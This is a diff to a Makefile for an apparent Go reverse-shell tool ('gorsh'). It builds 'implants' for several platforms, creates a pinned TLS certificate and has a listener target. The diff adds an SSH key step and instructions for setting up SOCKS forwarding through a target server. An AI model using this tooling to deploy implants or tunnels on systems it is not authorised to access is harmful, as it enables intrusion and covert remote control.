@@ -8,7 +8,7 @@ OUT_WINDOWS=binaries/windows/${NAME}
 SRV_KEY=scripts/server.key
 SRV_PEM=scripts/server.pem
 
-BUILD=go build
+BUILD=packr build
 SRC=cmd/gorsh/main.go
 
 FINGERPRINT=$(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
@@ -20,7 +20,8 @@ MINGW=x86_64-w64-mingw32-gcc-7.3-posix
 
 # zStd is a highly efficient compression library that requires CGO compilation If you'd like to
 # turn this feature on and have experience cross-compiling with cgo, enable the feature below for
-# win/64 and linux/64 implants ZSTD=-tags zstd
+# win/64 and linux/64 implants 
+# ZSTD=-tags zstd
 ZSTD=
 
 all: linux64 windows64 macos64 linux32 macos32 windows32 
@@ -28,6 +29,9 @@ all: linux64 windows64 macos64 linux32 macos32 windows32
 depends:
 	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
 	cat ${SRV_KEY} >> ${SRV_PEM}
+	ssh-keygen -t ed25519 -f configs/id_ed25519 -N ''
+	echo "Create a user with a /bin/false shell on the target ssh server that will be used "
+	echo "for socks forwarding. Also append the genereate pubkey to `authorized_keys`"
 
 listen:
 	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen.sh scripts/start.sh
